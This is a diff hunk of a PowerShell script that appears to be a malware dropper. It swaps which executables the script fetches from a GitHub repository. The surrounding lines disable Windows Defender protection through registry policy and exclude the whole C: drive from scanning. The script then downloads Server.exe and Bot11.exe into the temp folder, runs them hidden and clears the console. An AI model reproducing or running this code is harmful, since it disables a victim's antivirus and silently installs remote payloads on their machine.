@@ -14,15 +14,12 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 Write-Host "100%"
 $url1 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Server.exe"
-$url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/kilord.exe"
-$url3 = "https://github.com/sys1e/cmd/raw/refs/heads/main/xxx.exe"
+$url2 = "https://github.com/sys1e/cmd/raw/refs/heads/main/Bot11.exe"
 $path1 = "$env:TEMP\Server.exe"
-$path2 = "$env:TEMP\kilord.exe"
-$path3 = "$env:TEMP\xxx.exe"
+$path2 = "$env:TEMP\Bot11.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
-Invoke-WebRequest -Uri $url3 -OutFile $path3 -UseBasicParsing -ErrorAction SilentlyContinue
 Start-Process -FilePath $path1 -WindowStyle Hidden
 Start-Process -FilePath $path2 -WindowStyle Hidden
 Clear-Host
